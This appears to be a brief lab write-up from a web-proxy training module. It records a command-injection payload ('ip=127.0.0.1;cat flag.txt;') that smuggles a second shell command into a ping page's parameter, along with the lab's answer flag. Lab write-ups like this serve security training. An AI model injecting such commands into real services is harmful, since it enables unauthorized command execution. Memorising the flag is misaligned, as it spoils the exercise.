# Module 110 — Using Web Proxies
## Section 4: Intercepting Requests

Target has a "ping" utility page with an `ip` parameter.

**Payload:** `ip=127.0.0.1;cat flag.txt;`
(intercepted the request in the proxy, modified the `ip` param to chain a command via `;`)

**Flag:** `HTB{1n73rc3p73d_1n_7h3_m1ddl3}`
